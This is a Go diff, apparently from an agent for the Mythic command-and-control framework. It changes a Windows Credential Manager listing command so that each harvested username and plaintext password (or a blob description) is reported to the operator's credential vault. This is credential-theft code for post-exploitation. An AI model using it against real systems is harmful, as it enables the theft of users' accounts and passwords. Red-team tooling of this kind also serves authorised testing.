@@ -146,6 +146,7 @@ func credmanList(args credmanArgs, showPasswords bool) structs.CommandResult {
 
 	genericCount := 0
 	domainCount := 0
+	var mythicCreds []structs.MythicCredential
 
 	for _, cred := range credPtrs {
 		target := ""
@@ -169,8 +170,9 @@ func credmanList(args credmanArgs, showPasswords bool) structs.CommandResult {
 			lines = append(lines, fmt.Sprintf("  Username: %s", user))
 		}
 
+		password := ""
 		if showPasswords && cred.CredentialBlobSize > 0 && cred.CredentialBlob != nil {
-			password := extractCredBlob(cred)
+			password = extractCredBlob(cred)
 			if password != "" {
 				lines = append(lines, fmt.Sprintf("  Password: %s", password))
 			}
@@ -186,6 +188,23 @@ func credmanList(args credmanArgs, showPasswords bool) structs.CommandResult {
 		lines = append(lines, fmt.Sprintf("  Persist:  %s", persistName))
 		lines = append(lines, "")
 
+		// Report credentials with usernames to Mythic vault
+		if user != "" {
+			credType := "plaintext"
+			credValue := password
+			if credValue == "" || !showPasswords {
+				credType = "plaintext"
+				credValue = fmt.Sprintf("[credman:%s] blob=%d bytes", typeName, cred.CredentialBlobSize)
+			}
+			mythicCreds = append(mythicCreds, structs.MythicCredential{
+				CredentialType: credType,
+				Realm:          target,
+				Account:        user,
+				Credential:     credValue,
+				Comment:        fmt.Sprintf("credman %s (%s)", args.Action, typeName),
+			})
+		}
+
 		switch cred.Type {
 		case credTypeGeneric:
 			genericCount++
@@ -196,11 +215,15 @@ func credmanList(args credmanArgs, showPasswords bool) structs.CommandResult {
 
 	lines = append(lines, fmt.Sprintf("Summary: %d generic, %d domain credentials", genericCount, domainCount))
 
-	return structs.CommandResult{
+	result := structs.CommandResult{
 		Output:    strings.Join(lines, "\n"),
 		Status:    "success",
 		Completed: true,
 	}
+	if len(mythicCreds) > 0 {
+		result.Credentials = &mythicCreds
+	}
+	return result
 }
 
 func extractCredBlob(cred *credential) string {
